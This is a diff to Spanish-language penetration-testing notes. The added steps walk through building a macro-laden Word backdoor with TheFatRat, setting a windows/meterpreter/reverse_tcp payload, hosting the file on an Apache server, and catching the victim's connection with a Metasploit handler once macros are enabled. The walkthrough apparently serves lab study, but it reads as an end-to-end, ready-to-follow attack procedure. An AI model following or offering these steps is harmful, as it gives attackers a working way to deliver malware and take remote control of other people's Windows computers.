@@ -458,7 +458,44 @@ rmdir <nombre directorio> (Borrar directorio)
 --- Descargar el archivo y ejecutarlo
 --- Volver al kali
 --- En la terminal veremos una nueva sesión, lo que indica que tenemos control total sobre el equipo windows
---- 
+
+
+++ Crear arhivo malicioso de Word usando FatRat
+--- URL: https://github.com/StreetSec/FatRat
+--- Navegar al directorio del programa
+--- ls
+--- chmod +x setup.sh
+--- ./setup.sh
+--- y
+--- fatrat
+--- Seleccionar la opción 7 (Create Backdoor For Office with Microsploit)
+--- Seleccionar la opción 2 (The Microsoft Office Macro on Windows)
+--- Indicar la ip local
+--- Indicar el puerto, ejemplo: 8080
+--- Indicar el nombre del programa
+--- Presionar enter para indicar el mensaje por default 
+--- Teclear n y enter (No se usará un custom backdoor)
+--- Seleccionar el tipo de payload (3. windows/meterpreter/reverse_tcp)
+--- cd TheFatRat/output
+--- ls
+--- cp <nombre_archivo> /var/www/html (Copiado del archivo al servidor apache)
+--- use exploit/multi/handler
+--- set payload windows/meterpreter/reverse_tcp
+--- windows/meterpreter/reverse_tcp
+--- set LHOST <ip_local>
+--- set LPORT 8080
+--- run
+--- Ir a la pc con Windows
+--- Colocar la ip del kali
+--- Descargar y ejecutar el archivo
+--- El documento se abrirá indicando un mensaje de habilitar las macros
+--- Habilitar la macro
+--- Regresar al kali
+--- Aparecerá un mensaje de sesión abierta
+--- En estos momentos se tiene control total del equipo con windows
+
+
+
 
 
 
